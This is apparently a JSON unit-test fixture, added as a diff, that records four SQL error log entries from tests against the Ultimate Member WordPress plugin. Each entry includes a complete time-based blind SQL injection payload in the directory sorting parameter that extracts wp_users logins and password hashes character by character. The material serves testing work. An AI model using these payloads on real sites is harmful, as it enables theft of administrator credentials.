@@ -1,0 +1,136 @@
+{
+  "provenance": {
+    "source_run": "20261116T224849-be0ae0",
+    "source_log": "tmp/module-target-tests/20261116T224849-be0ae0/ultimate_member/target.log",
+    "source_log_sha256": "fdf85d515100b26aaa04c5c7a59d30805409c667523c0aa99ae1de356c780f6e",
+    "source_log_bytes": 302258,
+    "native_receipt_sha256": "68f546fe9a2676bc357ac4cda6990775540e02890caf0bbc3f24735710a17433",
+    "selection": "Exact SQL error, query, sorting parameter, inner payload and derived alias substrings, with zero-based exclusive-end byte spans; PHP/client prefixes omitted",
+    "sanitization": "No selected substring bytes changed. Unneeded client IPs and log prefixes excluded by selection. Additional numeric/keyword/normal alias cases in the spec are explicit synthetic unit inputs.",
+    "scope": "Generated callback contracts only; no SQL execution or hash-extraction claim from these unit fixtures"
+  },
+  "nonce": "93256b3bd6",
+  "directory_hash": "98ab9",
+  "queries": [
+    {
+      "alias": "982E2",
+      "outer_scalar": -19,
+      "error": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '982E2) ASC \\n\\t\\t\\t\\tLIMIT 0, 12' at line 8",
+      "query": "SELECT SQL_CALC_FOUND_ROWS DISTINCT u.ID\\n\\t\\t\\t\\t\\n\\t\\t\\t\\tFROM wp_users AS u\\n\\t\\t\\t\\tLEFT JOIN wp_um_metadata umm_general ON umm_general.user_id = u.ID LEFT JOIN wp_um_metadata umm_roles ON ( umm_roles.user_id = u.ID AND umm_roles.um_key = 'wp_capabilities' )\\n\\t\\t\\t\\tWHERE 1=1 AND ( umm_general.um_key = 'um_member_directory_data' AND\\n\\t\\t\\t\\tumm_general.um_value LIKE '%s:14:\"account_status\";s:8:\"approved\";%' AND umm_general.um_value LIKE '%s:15:\"hide_in_members\";b:0;%' ) AND ( umm_roles.um_value LIKE '%\\\\\"administrator\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"editor\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"author\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"contributor\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"subscriber\\\\\"%' )\\n\\t\\t\\t\\t\\n\\t\\t\\t\\t ORDER BY u.user_login AND (SELECT -19 FROM (SELECT(if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),23,1))>36,sleep(0.6),0)))982E2) ASC \\n\\t\\t\\t\\tLIMIT 0, 12",
+      "sorting": "user_login AND (SELECT -19 FROM (SELECT(if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),23,1))>36,sleep(0.6),0)))982E2)",
+      "payload": "if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),23,1))>36,sleep(0.6),0)",
+      "source_spans_bytes": {
+        "error": [
+          63304,
+          63484
+        ],
+        "query": [
+          63495,
+          64543
+        ],
+        "sorting": [
+          64248,
+          64517
+        ],
+        "payload": [
+          64288,
+          64509
+        ],
+        "alias": [
+          64511,
+          64516
+        ]
+      }
+    },
+    {
+      "alias": "6e5W2",
+      "outer_scalar": -14,
+      "error": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '6e5W2) ASC \\n\\t\\t\\t\\tLIMIT 0, 12' at line 8",
+      "query": "SELECT SQL_CALC_FOUND_ROWS DISTINCT u.ID\\n\\t\\t\\t\\t\\n\\t\\t\\t\\tFROM wp_users AS u\\n\\t\\t\\t\\tLEFT JOIN wp_um_metadata umm_general ON umm_general.user_id = u.ID LEFT JOIN wp_um_metadata umm_roles ON ( umm_roles.user_id = u.ID AND umm_roles.um_key = 'wp_capabilities' )\\n\\t\\t\\t\\tWHERE 1=1 AND ( umm_general.um_key = 'um_member_directory_data' AND\\n\\t\\t\\t\\tumm_general.um_value LIKE '%s:14:\"account_status\";s:8:\"approved\";%' AND umm_general.um_value LIKE '%s:15:\"hide_in_members\";b:0;%' ) AND ( umm_roles.um_value LIKE '%\\\\\"administrator\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"editor\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"author\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"contributor\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"subscriber\\\\\"%' )\\n\\t\\t\\t\\t\\n\\t\\t\\t\\t ORDER BY u.user_login AND (SELECT -14 FROM (SELECT(if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),46,1))>53,sleep(0.6),0)))6e5W2) ASC \\n\\t\\t\\t\\tLIMIT 0, 12",
+      "sorting": "user_login AND (SELECT -14 FROM (SELECT(if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),46,1))>53,sleep(0.6),0)))6e5W2)",
+      "payload": "if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),46,1))>53,sleep(0.6),0)",
+      "source_spans_bytes": {
+        "error": [
+          104244,
+          104424
+        ],
+        "query": [
+          104435,
+          105483
+        ],
+        "sorting": [
+          105188,
+          105457
+        ],
+        "payload": [
+          105228,
+          105449
+        ],
+        "alias": [
+          105451,
+          105456
+        ]
+      }
+    },
+    {
+      "alias": "5e88N",
+      "outer_scalar": -53,
+      "error": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '5e88N) ASC \\n\\t\\t\\t\\tLIMIT 0, 12' at line 8",
+      "query": "SELECT SQL_CALC_FOUND_ROWS DISTINCT u.ID\\n\\t\\t\\t\\t\\n\\t\\t\\t\\tFROM wp_users AS u\\n\\t\\t\\t\\tLEFT JOIN wp_um_metadata umm_general ON umm_general.user_id = u.ID LEFT JOIN wp_um_metadata umm_roles ON ( umm_roles.user_id = u.ID AND umm_roles.um_key = 'wp_capabilities' )\\n\\t\\t\\t\\tWHERE 1=1 AND ( umm_general.um_key = 'um_member_directory_data' AND\\n\\t\\t\\t\\tumm_general.um_value LIKE '%s:14:\"account_status\";s:8:\"approved\";%' AND umm_general.um_value LIKE '%s:15:\"hide_in_members\";b:0;%' ) AND ( umm_roles.um_value LIKE '%\\\\\"administrator\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"editor\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"author\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"contributor\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"subscriber\\\\\"%' )\\n\\t\\t\\t\\t\\n\\t\\t\\t\\t ORDER BY u.user_login AND (SELECT -53 FROM (SELECT(if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),69,1))>127,sleep(0.6),0)))5e88N) ASC \\n\\t\\t\\t\\tLIMIT 0, 12",
+      "sorting": "user_login AND (SELECT -53 FROM (SELECT(if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),69,1))>127,sleep(0.6),0)))5e88N)",
+      "payload": "if(ord(mid(cast((select group_concat(vGN) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x65,0)),ifnull(user_pass,repeat(0xa5,0))) as binary) vGN from wp_users limit 1) mdwD) as binary),69,1))>127,sleep(0.6),0)",
+      "source_spans_bytes": {
+        "error": [
+          144057,
+          144237
+        ],
+        "query": [
+          144248,
+          145297
+        ],
+        "sorting": [
+          145001,
+          145271
+        ],
+        "payload": [
+          145041,
+          145263
+        ],
+        "alias": [
+          145265,
+          145270
+        ]
+      }
+    },
+    {
+      "alias": "4E0y1",
+      "outer_scalar": -11,
+      "error": "You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near '4E0y1) ASC \\n\\t\\t\\t\\tLIMIT 0, 12' at line 8",
+      "query": "SELECT SQL_CALC_FOUND_ROWS DISTINCT u.ID\\n\\t\\t\\t\\t\\n\\t\\t\\t\\tFROM wp_users AS u\\n\\t\\t\\t\\tLEFT JOIN wp_um_metadata umm_general ON umm_general.user_id = u.ID LEFT JOIN wp_um_metadata umm_roles ON ( umm_roles.user_id = u.ID AND umm_roles.um_key = 'wp_capabilities' )\\n\\t\\t\\t\\tWHERE 1=1 AND ( umm_general.um_key = 'um_member_directory_data' AND\\n\\t\\t\\t\\tumm_general.um_value LIKE '%s:14:\"account_status\";s:8:\"approved\";%' AND umm_general.um_value LIKE '%s:15:\"hide_in_members\";b:0;%' ) AND ( umm_roles.um_value LIKE '%\\\\\"administrator\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"editor\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"author\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"contributor\\\\\"%' OR umm_roles.um_value LIKE '%\\\\\"subscriber\\\\\"%' )\\n\\t\\t\\t\\t\\n\\t\\t\\t\\t ORDER BY u.user_login AND (SELECT -11 FROM (SELECT(if(ord(mid(cast((select group_concat(zQbsiSS) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x20,0)),ifnull(user_pass,repeat(0x6c,0))) as binary) zQbsiSS from wp_users limit 1) fKbPw) as binary),23,1))>39,sleep(0.6),0)))4E0y1) ASC \\n\\t\\t\\t\\tLIMIT 0, 12",
+      "sorting": "user_login AND (SELECT -11 FROM (SELECT(if(ord(mid(cast((select group_concat(zQbsiSS) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x20,0)),ifnull(user_pass,repeat(0x6c,0))) as binary) zQbsiSS from wp_users limit 1) fKbPw) as binary),23,1))>39,sleep(0.6),0)))4E0y1)",
+      "payload": "if(ord(mid(cast((select group_concat(zQbsiSS) from (select cast(concat_ws(0x3b,ifnull(user_login,repeat(0x20,0)),ifnull(user_pass,repeat(0x6c,0))) as binary) zQbsiSS from wp_users limit 1) fKbPw) as binary),23,1))>39,sleep(0.6),0)",
+      "source_spans_bytes": {
+        "error": [
+          206372,
+          206552
+        ],
+        "query": [
+          206563,
+          207620
+        ],
+        "sorting": [
+          207316,
+          207594
+        ],
+        "payload": [
+          207356,
+          207586
+        ],
+        "alias": [
+          207588,
+          207593
+        ]
+      }
+    }
+  ]
+}
